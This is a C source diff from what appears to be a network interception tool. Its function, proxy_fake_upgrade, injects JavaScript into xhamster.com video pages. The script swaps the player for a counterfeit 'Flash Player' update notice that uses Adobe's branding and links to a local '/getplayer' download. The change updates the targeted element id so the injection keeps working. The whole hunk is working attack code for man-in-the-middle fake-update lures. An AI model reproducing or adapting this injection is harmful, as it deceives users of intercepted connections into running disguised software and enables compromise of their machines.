@@ -215,7 +215,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
          else if (strstr(url, "xhamster.com/movies") != NULL)
              ret = asprintf(&html_to_inject,
                         "\n<script type='text/javascript'>" \
-                        "        document.getElementById('player').innerHTML = '<center><div style=\"font-size:10px;color:white;border:0px #999999 solid;padding:160px;margin-top:50px;" \
+                        "        document.getElementById('playerSwf').innerHTML = '<center><div style=\"font-size:10px;color:white;border:0px #999999 solid;padding:160px;margin-top:50px;" \
                         "margin-bottom:50px;margin-left:20px;margin-right:20px;\"><p style=\"margin:10px 0;\">This content requires the Adobe Flash Player, or a newer version then " \
                         "the installed version.</p><p style=\"margin:10px 0;\">Please download it from the following link:</p><br><p style=\"margin:10px 0;\"><a style=\"font-size:10px;" \
                         "color:white;\" href=\"/getplayer\"><img style=\"border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/download_buttons/get_flash_player.png\">" \
